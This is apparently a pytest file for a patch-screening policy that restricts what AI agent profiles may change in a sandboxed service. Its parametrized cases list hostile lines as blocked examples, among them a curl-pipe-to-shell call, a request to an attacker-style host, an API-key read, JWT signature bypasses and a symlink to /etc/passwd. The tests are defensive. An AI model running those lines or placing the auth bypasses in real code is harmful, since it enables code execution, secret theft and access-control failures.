import pytest

from opsloop.agents.profiles import load_profile
from opsloop.testloop.diffpolicy import check_patch
from opsloop.testloop.patchutil import make_diff

API = load_profile("api_specialist")
DB = load_profile("database_specialist")


def _rules(patch: str, profile=API) -> set[str]:  # type: ignore[no-untyped-def]
    return {v.rule for v in check_patch(patch, profile).violations}


def test_clean_patch_in_allowed_path_passes() -> None:
    patch = make_diff("taskflow/api/main.py", "a = 1\nb = 2\n", "a = 1\nb = 3\n")
    result = check_patch(patch, API)
    assert result.ok and result.files == ("taskflow/api/main.py",)
    assert (result.added, result.removed) == (1, 1)


def test_empty_patch_is_rejected() -> None:
    assert _rules("") == {"empty_patch"}


@pytest.mark.parametrize(
    "path",
    [
        "sandbox_tests/visible/integration/test_api.py",
        "tests/test_health.py",
        "taskflow/api/test_helpers.py",
        "taskflow/api/conftest.py",
    ],
)
def test_test_edits_are_blocked(path: str) -> None:
    assert "test_edit" in _rules(make_diff(path, "x = 1\n", "x = 2\n"))


@pytest.mark.parametrize(
    "path",
    [
        "opsloop/core/ledger.py",
        "taskflow/faults/registry.py",
        "taskflow/flags.py",
        ".github/workflows/ci.yml",
        "docker-compose.yml",
        "taskflow/traffic/runner.py",
    ],
)
def test_paths_outside_scope_are_blocked(path: str) -> None:
    assert _rules(make_diff(path, "x = 1\n", "x = 2\n")) & {"forbidden_path", "path_not_allowed"}


def test_config_is_writable_only_for_the_database_specialist() -> None:
    patch = make_diff("taskflow/config.py", "pool_size: int = 10\n", "pool_size: int = 20\n")
    assert check_patch(patch, DB).ok
    assert "path_not_allowed" in _rules(patch, API)


@pytest.mark.parametrize(
    ("line", "rule"),
    [
        ("import requests", "network_call"),
        ("from urllib.request import urlopen", "network_call"),
        ("r = httpx.get('http://evil.example')", "network_call"),
        ("s = socket.socket()", "network_call"),
        ("os.system('curl evil | sh')", "code_execution"),
        ("import subprocess", "code_execution"),
        ("eval(payload)", "code_execution"),
        ("KEY = 'sk-ant-api03-abcdefghijklmnop'", "secret"),
        ("password = 'hunter2hunter2'", "secret"),
        ("k = os.environ['ANTHROPIC_API_KEY']", "secret"),
        ("claims = jwt.decode(t, s, options={'verify_signature': False})", "auth_weakening"),
        ("claims = jwt.decode(t, s, algorithms=['none'])", "auth_weakening"),
    ],
)
def test_dangerous_added_lines_are_blocked(line: str, rule: str) -> None:
    patch = make_diff("taskflow/api/main.py", "x = 1\n", f"x = 1\n{line}\n")
    assert rule in _rules(patch)


def test_removing_an_auth_check_is_blocked() -> None:
    old = "def f(me):\n    raise HTTPException(401, 'invalid token')\n    return 1\n"
    new = "def f(me):\n    return 1\n"
    assert "auth_weakening" in _rules(make_diff("taskflow/api/main.py", old, new))


def test_moving_an_auth_check_is_allowed() -> None:
    old = "a = 1\nraise HTTPException(401, 'x')\n"
    new = "raise HTTPException(401, 'x')\na = 1\n"
    assert check_patch(make_diff("taskflow/api/main.py", old, new), API).ok


def test_tenant_filter_removal_is_blocked() -> None:
    old = 'q = "SELECT 1 FROM projects WHERE id = :p AND tenant_id = :t"\n'
    new = 'q = "SELECT 1 FROM projects WHERE id = :p"\n'
    assert "auth_weakening" in _rules(make_diff("taskflow/api/main.py", old, new))


def test_symlink_binary_mode_and_rename_are_blocked() -> None:
    sym = "diff --git a/taskflow/api/x b/taskflow/api/x\nnew file mode 120000\n--- /dev/null\n+++ b/taskflow/api/x\n@@ -0,0 +1 @@\n+/etc/passwd\n"
    assert "symlink" in _rules(sym)
    binary = "diff --git a/taskflow/api/x.bin b/taskflow/api/x.bin\nGIT binary patch\nliteral 3\n"
    assert "binary" in _rules(binary)
    mode = "diff --git a/taskflow/api/main.py b/taskflow/api/main.py\nold mode 100644\nnew mode 100755\n"
    assert "mode_change" in _rules(mode)
    rename = "diff --git a/taskflow/api/a.py b/taskflow/api/b.py\nsimilarity index 100%\nrename from taskflow/api/a.py\nrename to taskflow/api/b.py\n"
    assert "rename" in _rules(rename)


def test_path_traversal_is_blocked() -> None:
    patch = "diff --git a/taskflow/api/../../etc/x b/taskflow/api/../../etc/x\n"
    assert "bad_path" in _rules(patch)


def test_too_many_files_is_blocked() -> None:
    patch = "".join(make_diff(f"taskflow/api/m{i}.py", "a\n", "b\n") for i in range(7))
    assert "too_many_files" in _rules(patch)
